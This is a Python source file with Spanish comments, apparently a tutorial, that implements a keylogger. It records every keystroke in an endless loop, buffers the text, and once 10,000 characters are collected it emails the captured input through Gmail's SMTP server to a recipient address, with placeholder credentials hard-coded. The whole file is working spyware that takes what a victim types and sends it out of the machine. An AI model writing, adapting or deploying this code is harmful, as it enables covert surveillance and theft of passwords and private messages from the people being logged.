import keyboard as key #Hay que instalar keyboard con pip
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import datetime

texto = ""

#Bucle infinito para que siempre esté activo el programa
while True: 
    guardado = str(key.read_event())#Esta funcion captura las pulsaciones del teclado
    #Con esto le damos formato a los eventos que va capturando el teclado, sin esto, lo que el programa mostrará
    #será: 'KeyboardEvent(tecla up)' Además, como la funcion read_event captura también el momento en que se deja de pulsar una tecla
    #con este if le indicamos que guarde solo el evento 'up' que es cuando se pulsa la tecla, descartando el evento 
    #'down' que es cuando se deja de pulsar la tecla
    if guardado.__contains__('up'):
        guardado = guardado.replace('KeyboardEvent(','')
        guardado = guardado.replace('up)','')

#Vamos almacenando cada tecla dentro de una variable para luego trabajar con ella
        if(len(guardado)>1):
            texto = texto + " " + guardado + " "
        else:
            texto = texto + guardado
#Cuando llegue a determinada cantidad de caracteres guardados, enviará el texto por correo    
    if(len(texto) >=10000):
        try:
            mensaje = MIMEMultipart()
            contras = "MiContraseña123" #contraseña del correo desde donde se enviará la información
            mensaje['From']="alguncorreo@gmail.com" #correo desde donde se enviará la información
            mensaje['To']="otrocorreo@hotmail.com" #correo que recibirá la información
            mensaje['Subject']="Reporte "+ str(datetime.datetime.now().date()) #el asunto del correo
         #pueden agregar cualquier texto en el asunto, yo le estoy enviando la fecha en que se hizo la captura de teclado   
            mensaje.attach(MIMEText(texto, 'plain')) #contenido del correo, la variable donde se guardó el teclado, configurado como texto plano

            #iniciamos el servidor para enviar el correo
            servidor = smtplib.SMTP('smtp.gmail.com: 587')
            servidor.starttls()
            servidor.login(mensaje['From'], contras) #inicia sesión con la información que se le ha proporcionado antes
            servidor.sendmail(mensaje['From'], mensaje['To'], mensaje.as_string()) #envía el correo
            servidor.quit() #cierra el servidor

            #reinicia la variable que usamos para guardar el teclado
            texto = ""
        except:
        	#e caso que ocurra un error en el proceso de enviar el correo
            print("Error")